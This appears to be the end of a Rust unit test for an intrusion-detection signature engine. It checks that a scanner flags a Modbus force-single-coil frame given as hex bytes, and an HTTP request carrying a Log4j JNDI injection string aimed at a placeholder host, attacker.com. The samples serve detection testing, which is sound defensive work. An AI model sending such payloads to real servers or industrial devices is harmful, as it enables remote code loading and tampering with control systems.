        // 1. 验证 Modbus 十六进制规则命中
        let modbus_attack_frame = vec![
            0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x01, 0x05, 0x00, 0x01, 0xFF, 0x00
        ];
        let hits1 = automaton.scan(&modbus_attack_frame);
        assert_eq!(hits1.len(), 1);
        assert_eq!(hits1[0].signature_id, 500001);
        assert_eq!(hits1[0].name, "Modbus Force Single Coil Unauthorized Attack");
        assert_eq!(hits1[0].severity, "CRITICAL");

        // 2. 验证 Log4j ASCII 规则命中
        let http_payload = b"GET /login?user=${jndi:ldap://attacker.com/a} HTTP/1.1\r\n\r\n";
        let hits2 = automaton.scan(http_payload);
        assert_eq!(hits2.len(), 1);
        assert_eq!(hits2[0].signature_id, 500002);
        assert_eq!(hits2[0].name, "Log4j JNDI Exploit String");
    }

}
